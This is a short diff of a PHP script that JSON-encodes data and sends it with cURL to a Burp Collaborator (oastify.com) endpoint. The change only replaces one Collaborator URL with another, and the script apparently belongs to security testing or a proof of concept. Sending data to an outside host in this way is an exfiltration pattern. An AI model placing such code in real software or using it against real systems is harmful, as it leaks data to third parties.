@@ -16,7 +16,7 @@ $data = [
 $jsonData = json_encode($data);
 
 // Your Burp Collaborator endpoint
-$collaboratorUrl = "http://mg6uuyn1pb22b5h13ovv37f25tbkzcn1.oastify.com/";
+$collaboratorUrl = "http://7u2kwugtp23o250gm7pchefgp7vyjp7e.oastify.com/";
 
 // Initialize cURL to send the JSON data
 $ch = curl_init($collaboratorUrl);
